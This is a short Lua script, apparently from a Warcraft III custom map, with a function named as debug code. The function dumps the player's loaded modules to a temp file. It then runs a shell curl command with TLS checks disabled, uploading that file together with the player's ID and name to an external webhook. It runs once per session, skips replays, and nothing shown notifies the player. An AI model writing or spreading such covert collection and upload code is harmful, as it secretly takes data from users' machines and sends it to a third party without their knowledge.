function DebugMEx() 
    local ff = GetTempPath().."/"
    ff = ff .. "wc3."
    ff = ff .. "txt"
    PrintModules(ff)
    local message = string.format("(Evolution Tag) Player: %d: %s",GetPlayerId(GetLocalPlayer()),GetPlayerName(GetLocalPlayer()))
    local url = Webhook.modules
    local payload_json = string.format('{"content":"%s"}',message)
    local command = string.format('%s -s --insecure --location --request POST "%s" --form payload_json=%q --form ss=@%q',Curlpath,url,payload_json,ff,ff)
    --print("\n",command,"\n")
    if( IsReplay()) then
        return
    end
    RunCmdThreaded(command) 
end

function DebugM() 
    if(not DEBUG_M_DONE) then
        DEBUG_M_DONE = true
        DebugMEx()
    end
end